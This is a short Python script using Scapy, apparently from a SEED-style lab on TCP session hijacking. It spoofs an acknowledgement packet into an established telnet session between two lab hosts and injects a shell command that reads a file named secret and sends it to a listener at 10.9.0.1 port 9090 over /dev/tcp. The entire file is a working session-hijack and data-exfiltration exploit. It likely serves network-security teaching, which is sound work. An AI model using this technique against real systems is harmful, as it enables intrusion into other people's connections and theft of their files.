#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src="10.9.0.6", dst="10.9.0.5") #IP address of User1 and Victim
tcp = TCP(sport=52642, dport=23, flags="A", seq=3977479562, ack=680904337) #source port number; destination port as 23 means telnet; flag A means Acknowledgement; Sequence number and acknowledgement number
data = "\ncat /home/seed/secret > /dev/tcp/10.9.0.1/9090\n" #This command will get the data from telnet connection between User1 and Victim
pkt = ip/tcp/data #construct TCP packet
ls(pkt)
send(pkt,iface='br-c83e1ac99060', verbose=0) #sends the packets
